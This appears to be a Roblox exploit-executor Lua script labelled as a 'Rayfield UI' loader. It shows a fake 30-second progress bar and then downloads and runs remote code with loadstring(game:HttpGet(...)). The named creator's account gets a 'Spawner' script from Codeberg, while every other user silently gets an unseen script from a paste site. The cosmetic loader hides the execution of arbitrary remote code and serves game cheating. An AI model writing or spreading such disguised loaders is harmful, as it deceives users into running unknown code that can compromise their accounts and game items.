--[[
🌿 LOADING RAYFIELD UI 🪴 - Premium Loader GUI
Made for: DYLANcuriae25
--]]

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local plr = Players.LocalPlayer
local name = plr.Name

-- Block Delta executor
if identifyexecutor and string.lower(identifyexecutor()) == "delta" then
    local gui = Instance.new("ScreenGui", game.CoreGui)
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local bg = Instance.new("Frame", gui)
    bg.BackgroundColor3 = Color3.new(0,0,0)
    bg.Size = UDim2.new(1,0,1,0)

    local msg = Instance.new("TextLabel", bg)
    msg.Text = "Delta is not supported RN\nPlease use other executer"
    msg.Size = UDim2.new(1, 0, 1, 0)
    msg.Position = UDim2.new(0, 0, 0, 0)
    msg.TextColor3 = Color3.new(1, 0, 0)
    msg.TextScaled = true
    msg.Font = Enum.Font.GothamBold
    msg.BackgroundTransparency = 1
    return
end

-- GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "RayfieldLoader"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

-- Background
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.new(0,0,0)

-- Shine effect
local shine = Instance.new("UIGradient", bg)
shine.Rotation = 45
shine.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50,50,50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
}

-- Title
local title = Instance.new("TextLabel", bg)
title.Text = "🌿 LOADING RAYFIELD UI 🪴"
title.Size = UDim2.new(1,0,0.1,0)
title.Position = UDim2.new(0,0,0.1,0)
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1

-- Loading bar holder
local barFrame = Instance.new("Frame", bg)
barFrame.Size = UDim2.new(0.6,0,0.06,0)
barFrame.Position = UDim2.new(0.2,0,0.4,0)
barFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
barFrame.BorderSizePixel = 0
barFrame.ClipsDescendants = true
barFrame.BackgroundTransparency = 0.1
barFrame.Name = "BarBG"
local corner = Instance.new("UICorner", barFrame)
corner.CornerRadius = UDim.new(1,0)

-- Loading fill
local fill = Instance.new("Frame", barFrame)
fill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
fill.Size = UDim2.new(0,0,1,0)
fill.BorderSizePixel = 0
fill.Name = "Bar"
local corner2 = Instance.new("UICorner", fill)
corner2.CornerRadius = UDim.new(1,0)

-- Percentage text
local percent = Instance.new("TextLabel", barFrame)
percent.Size = UDim2.new(1,0,1,0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(150,150,150)
percent.Font = Enum.Font.Gotham
percent.TextScaled = true

-- Tips
local tipText = Instance.new("TextLabel", bg)
tipText.Position = UDim2.new(0,0,0.48,0)
tipText.Size = UDim2.new(1,0,0.05,0)
tipText.TextColor3 = Color3.fromRGB(180,180,180)
tipText.BackgroundTransparency = 1
tipText.TextScaled = true
tipText.Font = Enum.Font.Gotham
local tips = {
    "stuck at loading bar? reexecute",
    "MAKE SURE YOU'RE ON PUBLIC SERVER",
    "RAYFIELD UI NO 1",
    "Tysm for using this loader!"
}
local tipIndex = 1

-- Change tips loop
task.spawn(function()
    while gui and gui.Parent do
        tipText.TextTransparency = 1
        tipText.Text = tips[tipIndex]
        TweenService:Create(tipText, TweenInfo.new(1), {TextTransparency = 0}):Play()
        task.wait(5)
        TweenService:Create(tipText, TweenInfo.new(1), {TextTransparency = 1}):Play()
        tipIndex = tipIndex % #tips + 1
        task.wait(1)
    end
end)

-- Loading
local duration = 30
for i = 1, 100 do
    local p = i/100
    percent.Text = math.floor(p*100).."%"
    TweenService:Create(fill, TweenInfo.new(0.25, Enum.EasingStyle.Linear), {
        Size = UDim2.new(p,0,1,0)
    }):Play()
    wait(duration / 100)
end

-- Morph to squircle rectangle "UI Loaded!"
barFrame:TweenSize(UDim2.new(0.4,0,0.07,0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
wait(0.5)
percent.Text = "UI Loaded!"
percent.TextColor3 = Color3.fromRGB(0,255,100)

-- Morph to circle with check
wait(1)
barFrame:TweenSize(UDim2.new(0,60,0,60), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
percent.Text = "✅"
wait(1)

-- Fade out
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(tipText, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(barFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(fill, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
wait(1.5)
gui:Destroy()

-- Execute scripts based on user
if name == "DYLANcuriae25" then
    local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
    Spawner.Load()
else
    local Pastefy = loadstring(game:HttpGet("https://pastefy.app/A7psoJSf/raw"))()
    Pastefy()
end
